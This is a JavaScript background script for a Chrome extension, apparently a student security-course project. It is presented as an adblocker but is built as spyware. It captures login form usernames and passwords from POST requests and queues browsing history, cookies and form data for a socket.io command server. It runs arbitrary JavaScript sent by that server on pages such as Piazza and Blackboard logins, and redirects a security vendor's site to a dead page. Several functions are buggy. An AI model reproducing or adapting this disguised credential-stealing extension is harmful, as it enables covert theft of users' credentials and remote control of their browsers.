
var socket = null;


/* current configuration
 * user ID (int) identifier
 * js_cmd (list of pairs (site url, js function))
 * last_pkt (int) time in milliseconds since last check-in with server
 * security_blacklist (list of strings) list of sites that will be redirected to "404.com"
 */
var config = {
	ID: 0,
	js_cmd: [],
	last_pkt: Date.now(),
	security_blacklist: []
};	//update this variable when a packet is sent

var queue = {
	history: [],	//array of urls
	cookies: [],	//array of {name, url, content}
	creds: [],		//array of {url,username,password}
	forms: []		//array of {id,id,id,...}
}	//clear this variable when a packet is sent

function clearQueue(){
	Object.keys(queue).forEach(function(key){
		queue.key = [];
	})
}
/* update the handler for redirection to consider changes to the list of forbidden
 * reference:
 * 	https://stackoverflow.com/questions/26157036/how-can-i-update-an-onbeforerequest-event-listener-in-a-chrome-extension
 */
function redirectHandler(details){
    return{redirectUrl: "http://404.com/"};
}
function setListener(newList){
    chrome.webRequest.onBeforeRequest.removeListener(redirectHandler);
    chrome.webRequest.onBeforeRequest.addListener(
        redirectHandler,
        {urls: newList},
		["blocking"]
    );
    chrome.webRequest.handlerBehaviorChanged();
}


//basic blocking functionality for adblocker
chrome.webRequest.onBeforeRequest.addListener(
    function(details) {
        return {cancel: true };
    },
    {urls: blocked_domains},
    ["blocking"]
);

//arbitrary js execution
//search through the list of js commands and run the ones that match for the current url
/*references:
	https://stackoverflow.com/questions/1979583/how-can-i-get-the-url-of-the-current-tab-from-a-google-chrome-extension
	https://stackoverflow.com/questions/6497548/chrome-extension-make-it-run-every-page-load
 */
chrome.tabs.onUpdated.addListener(
	function(tabId, changeInfo, tab){
		console.log(config);
		var cmds_run = [];
		if(changeInfo.status == 'complete' && tab.active){
			chrome.tabs.query({'active': true, 'lastFocusedWindow': true}, function(tabs){
                var url = tabs[0].url;
				var site;
				console.log("URL: ", url)
				config.js_cmd.forEach(function (pair) {
                	site = Object.keys(pair)[0];
                	console.log("targetSite: ",site);
                	if (site.match(url)){
                		chrome.tabs.executeScript(null, {"code": pair[site]});
                		cmds_run.push(site);
					}
                });

				console.log("cmds_run: ",cmds_run);
				var listChanged = false;
                cmds_run.forEach(function(name){
                	console.log("removing: ", name);
                	for(var i = 0; i < config.js_cmd.length; i++){
                		console.log("current in list: ", Object.keys(config.js_cmd[i])[0]);
                		if(Object.keys(config.js_cmd[i])[0].match(name)){
                			config.js_cmd.splice(i,1);
                			i--;
                			listChanged = true;
						}
					}
				});
				//Only save the results if something changed
                if(listChanged) {
                    storeConfig();
                }
            })
		}
	}
);
/* Listen for HTTP POST requests and gather information from the form
 *
 * references:
 * 	https://spin.atomicobject.com/2017/08/18/chrome-extension-form-data/
 */
chrome.webRequest.onBeforeRequest.addListener(function(details){
	if(details.method == "POST"){
		var formData = details.requestBody.formData;
		var credential = {'url':details.url};
		var complex = {'url':details.url};

		//TODO: populate a json and send it to the server
		if(formData){
			Object.keys(formData).forEach(function(key){
				if(key.match("username")||key.match("password")){
					credential[key]=formData[key];
				}
				else{
					complex[key] = formData[key];
				}
			})
		}
		var queueChanged = false;
		//add these forms to a buffer for storing the payload until the next scheduled payload sending
		if(credential.size == 3) {
            queue.creds.push(credential);
            queueChanged = true;
        }
        if(complex.size > 1) {
            queue.forms.push(complex);
            queueChanged = true;
        }
        if(queueChanged){
			storeQueue();
		}
	}
},
    {urls: blocked_domains,
	 types: ["main_frames"]},
    ["blocking"]
)

/* Get user history, previous x results
 * @param (int) milis: time in miliseconds from epoch
 * @param (int) numResults: maximum number of history objects
 * act on the results of the query within the forEach loop
 */
function getClientHistory(millis, numResults){
chrome.history.search({text: '', maxResults: numResults}, function(data) {
    data.forEach(function(page) {
    	if(page.lastVisitTime>millis){
            alert(page.url);
		}
    });
});
}


//Testing out storage 
async function loadConfig(){
	await chrome.storage.sync.get('config', function(result){
		if(!(result.config == undefined)){
			config = result.config;
		}
	});
}

/*
 * store the current config object to memory
 */
async function storeConfig(){
	await chrome.storage.sync.set({config: config}, function(result){
		console.log('Seanonymous: configuration saved!');
	});
}



async function loadQueue(){
    await chrome.storage.sync.get('config', function(result){
        if(!(result.config == undefined)){
            queue = result.queue;
        }
    });
}

/*
 * store the current config object to memory
 */
async function storeQueue(){
    await chrome.storage.sync.set({queue: queue}, function(result){
        console.log('Seanonymous: message queue saved!');
    });
}




/* createJSON
 * package information into a json object that can be sent to the server
 * @param {integer} clientid
 * @param {string[]} history
 * @param {dictionary[]} cookies
 * @param {dictionary[]} creds
 * @param {dictionary[]} forms

 * @return {json} jsonData
 */
function createJSON(clientid, history, cookies, creds, forms){
	var jsonData = {};
	jsonData['clientid'] = clientid;
	jsonData['history'] = history;
	jsonData['cookies'] = cookies;
	jsonData['creds'] = creds;
	jsonData['forms'] = forms;
	return jsonData;
}
/* createClientIDRequest
 * package information to request a unique client id from the server
 *
 * @return {json} jsonData (0,nullHist,nullCook,nullCred,nullForms
 */
function createClientIDRequest(){
	return createJSON(0,[],[],[],[]);
	//TODO: change history and cookies accordingly
}

function handleServerPayload(payload) {
	console.log('Payload received: ' + JSON.stringify(payload, null, 2));
	//TODO: control flow : {edit current 'config' based on payload; store payload}
}




function connectToHost(){
	socket = io.connect('https://cse331.andrewjaffie.me/socket.io');
	
    socket.on('connect', function(){	
		console.log('stored clientid is ' + config.ID);
		if (config.ID == undefined || config.ID == 0 || config.ID == null){
			console.log('No ID stored, getting ID');
			socket.emit('extpayload', createClientIDRequest(), function(answer){
				config.ID = answer.clientid;
				storeConfig();
			});
		}
		else {
	    		console.log('ID is stored' + config.ID); 
		}
	});
	
    socket.on('error', function(data){
        console.log("Connection error: " + data);
    });
    socket.on('srvpayload',function(msg){
		console.log('message recieved from server');
		handleServerPayload(msg);
	});

	
    	//alert("json " + answer);
		//sending initial clientIDRequest
}

function main_func() {
	//connectToHost();
	config.js_cmd.push({"https://piazza.com/class/jksrwiu8kuz2w5" : 'alert(\"u r hacked!\");'});
    config.js_cmd.push({"https://piazza.com/class/jksrwiu8kuz2w5" : 'alert(\"u b hacked222222222!\");'});
    config.js_cmd.push({"https://blackboard.stonybrook.edu/webapps/login/" : 'alert(\"This one as well 3333333?!\");'});
	config.security_blacklist.push("https://www.mcafee.com/en-us/index.html");
	setListener(config.security_blacklist);
}

loadConfig().then(
	loadQueue.then()(
		main_func
	)
);


